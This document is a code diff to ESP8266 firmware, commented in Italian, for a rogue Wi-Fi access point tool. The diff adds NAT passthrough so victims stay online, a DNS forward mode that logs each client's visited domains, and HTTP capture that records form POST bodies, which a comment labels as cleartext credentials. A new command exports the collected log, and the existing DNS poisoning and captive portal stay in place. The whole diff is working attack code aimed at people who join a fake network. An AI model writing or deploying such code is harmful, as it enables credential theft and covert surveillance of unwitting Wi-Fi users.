@@ -24,6 +24,7 @@
 #include <ESP8266WiFi.h>
 #include <WiFiUdp.h>
 #include <user_interface.h>
+#include <lwip/napt.h>   // ip_napt_enable: NAT reale per i client del rogue AP
 
 // ============ CONFIG ============
 const char *STA_SSID = "Hexxeted";
@@ -80,6 +81,22 @@ int portalLen = 0;
 bool karmaArmed = false;
 String probeSsids[24];
 int probeCount = 0;
+
+// sniffing traffico client: DNS qname + HTTP portal (form = credenziali)
+String sniffLog[20];
+int sniffCount = 0;
+bool dnsFwd = false;
+IPAddress dnsClientIP;
+uint16_t dnsClientPort = 0;
+bool dnsPending = false;
+uint32_t dnsPendingAt = 0;
+
+void sniffPush(const String &s) {
+  for (int k = 0; k < sniffCount; k++) if (sniffLog[k] == s) return;
+  if (sniffCount < 20) { sniffLog[sniffCount++] = s; return; }
+  for (int k = 1; k < 20; k++) sniffLog[k - 1] = sniffLog[k];
+  sniffLog[19] = s;
+}
 
 WiFiUDP dnsSrv;
 WiFiServer portalSrv(80);
@@ -301,23 +318,64 @@ void feedRx(const uint8_t *d, int n) {
   }
 }
 
-// ============ rogue AP: DNS poison + captive portal ============
+// ============ rogue AP: DNS poison/forward + captive portal ============
 void dnsTick() {
-  if (!rogue || !dnsPoison) return;
+  if (!rogue) return;
   int ps = dnsSrv.parsePacket();
   if (ps <= 0) return;
+  // risposta upstream in forward mode: porta sorgente 53
+  if (dnsFwd && dnsSrv.remotePort() == 53) {
+    if (dnsPending && millis() - dnsPendingAt > 4000) dnsPending = false;
+    static uint8_t rp[512];
+    int rn = dnsSrv.read(rp, sizeof(rp));
+    if (dnsPending && rn > 0) {
+      dnsSrv.beginPacket(dnsClientIP, dnsClientPort);
+      dnsSrv.write(rp, rn);
+      dnsSrv.endPacket();
+      dnsPending = false;
+    }
+    return;
+  }
   static uint8_t q[512];
   int n = dnsSrv.read(q, sizeof(q));
   if (n < 17) return;
-  // risposta: copio la query, fixo flags QR+AA, appendo 1 answer A 192.168.4.1
-  q[2] = 0x85; q[3] = 0x80;
-  q[6] = 0; q[7] = 1;
-  static const uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
-                                  0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 192, 168, 4, 1};
-  dnsSrv.beginPacket(dnsSrv.remoteIP(), dnsSrv.remotePort());
-  dnsSrv.write(q, n);
-  dnsSrv.write(ans, sizeof(ans));
-  dnsSrv.endPacket();
+  // QNAME (offset 12, label len-prefixed, stop su 0 o pointer 0xC0)
+  String qn;
+  int o = 12;
+  while (o < n && q[o] > 0 && q[o] < 64 && o + 1 + q[o] <= n) {
+    char lb[64];
+    memcpy(lb, q + o + 1, q[o]);
+    lb[q[o]] = 0;
+    qn += lb;
+    qn += '.';
+    o += q[o] + 1;
+  }
+  if (qn.length() > 4) {
+    qn.remove(qn.length() - 1);
+    sniffPush("D:" + qn);
+  }
+  dnsClientIP = dnsSrv.remoteIP();
+  dnsClientPort = dnsSrv.remotePort();
+  if (!dnsFwd) {
+    // poison: tutte le A → 192.168.4.1 (captive portal + HTTP capture)
+    q[2] = 0x85; q[3] = 0x80;
+    q[6] = 0; q[7] = 1;
+    static const uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
+                                    0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 192, 168, 4, 1};
+    dnsSrv.beginPacket(dnsClientIP, dnsClientPort);
+    dnsSrv.write(q, n);
+    dnsSrv.write(ans, sizeof(ans));
+    dnsSrv.endPacket();
+  } else {
+    // forward al resolver dell'hotspot: internet reale + log qname
+    IPAddress up = WiFi.dnsIP();
+    if (up == IPAddress(0, 0, 0, 0)) return;
+    dnsSrv.beginPacket(up, 53);
+    dnsSrv.write(q, n);
+    dnsSrv.endPacket();
+    dnsPending = true;
+    dnsPendingAt = millis();
+  }
 }
 
 void portalTick() {
@@ -326,10 +384,41 @@ void portalTick() {
   if (!c) return;
   uint32_t t0 = millis();
   String head;
-  while (c.connected() && millis() - t0 < 1500) {
+  while (c.connected() && millis() - t0 < 2000) {
     while (c.available()) head += (char)c.read();
-    if (head.indexOf("\r\n\r\n") >= 0) break;
+    if (head.indexOf("\r\n\r\n") >= 0) {
+      // POST: aspetto il body completo (content-length, max 600B)
+      int clIdx = head.indexOf("Content-Length:");
+      if (clIdx < 0) clIdx = head.indexOf("content-length:");
+      if (clIdx >= 0) {
+        int cl = head.substring(clIdx + 15).toInt();
+        if (cl > 0 && cl <= 600) {
+          uint32_t t1 = millis();
+          while (c.connected() && millis() - t1 < 1500) {
+            while (c.available()) head += (char)c.read();
+            if (head.length() >= head.indexOf("\r\n\r\n") + 4 + cl) break;
+          }
+        }
+      }
+      break;
+    }
   }
+  // capture: request line + Host + form body (credenziali in chiaro)
+  int sp = head.indexOf(' ');
+  String method = (sp > 0) ? head.substring(0, sp) : "?";
+  String path = "";
+  if (sp > 0) {
+    int sp2 = head.indexOf(' ', sp + 1);
+    if (sp2 > sp) path = head.substring(sp + 1, sp2);
+  }
+  int hi = head.indexOf("Host: ");
+  String host = (hi >= 0) ? head.substring(hi + 6, head.indexOf("\r\n", hi)) : "";
+  String body = (head.indexOf("\r\n\r\n") >= 0) ? head.substring(head.indexOf("\r\n\r\n") + 4) : "";
+  String entry = method + " http://" + host + path;
+  if (body.length() > 0 && body.length() < 300) entry += "  [" + body + "]";
+  sniffPush("H:" + entry);
+  Serial.printf("[portal] %s\n", entry.c_str());
+
   String page = (portalLen > 0) ? String(portalPage) :
     String("<html><body><h2>RHS Portal</h2><p>connessione acquisita dal bridge RedHatSec</p></body></html>");
   String r = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: ";
@@ -567,7 +656,9 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       portalSrv.stop();
       portalSrv.begin();
       rogue = true;
-      Serial.printf("[rogue] %s ch%d dns=%d\n", rogueSsid, apChannel, dnsPoison);
+      sniffCount = 0;                        // log pulito a ogni rogue session
+      ip_napt_enable((uint32_t)WiFi.localIP(), 1);   // internet passthrough per i client
+      Serial.printf("[rogue] %s ch%d dns=%d napt=1\n", rogueSsid, apChannel, dnsPoison);
       sendFrame(0x13, 0x00, nullptr, 0);
       break;
     }
@@ -575,8 +666,12 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
     case 0x14: {  // rogueStop
       rogue = false;
       dnsPoison = false;
+      dnsFwd = false;
+      dnsPending = false;
+      sniffCount = 0;
       dnsSrv.stop();
       portalSrv.stop();
+      ip_napt_enable((uint32_t)WiFi.localIP(), 0);
       WiFi.softAPdisconnect(true);
       delay(200);
       WiFi.mode(WIFI_STA);
@@ -637,6 +732,26 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       memcpy(portalPage, pl + 2, l);
       portalLen = l;
       sendFrame(0x17, 0x00, nullptr, 0);
+      break;
+    }
+
+    case 0x18: {  // nat[on][dnsFwd] — NAPT passthrough internet + mode DNS (0=poison, 1=forward)
+      if (plen < 2) { sendFrame(0x18, 0x02, (const uint8_t *)"bad args", 8); break; }
+      ip_napt_enable((uint32_t)WiFi.localIP(), pl[0] ? 1 : 0);
+      dnsFwd = pl[1] != 0;
+      dnsPending = false;
+      Serial.printf("[nat] %d dnsFwd=%d\n", pl[0], pl[1]);
+      sendFrame(0x18, 0x00, nullptr, 0);
+      break;
+    }
+
+    case 0x19: {  // sniffLog → CSV "D:qname|H:http" (DNS visitati + HTTP/form catturati)
+      String csv;
+      for (int k = 0; k < sniffCount; k++) {
+        if (k) csv += "|";
+        csv += sniffLog[k];
+      }
+      sendFrame(0x19, 0x00, (const uint8_t *)csv.c_str(), csv.length());
       break;
     }
 
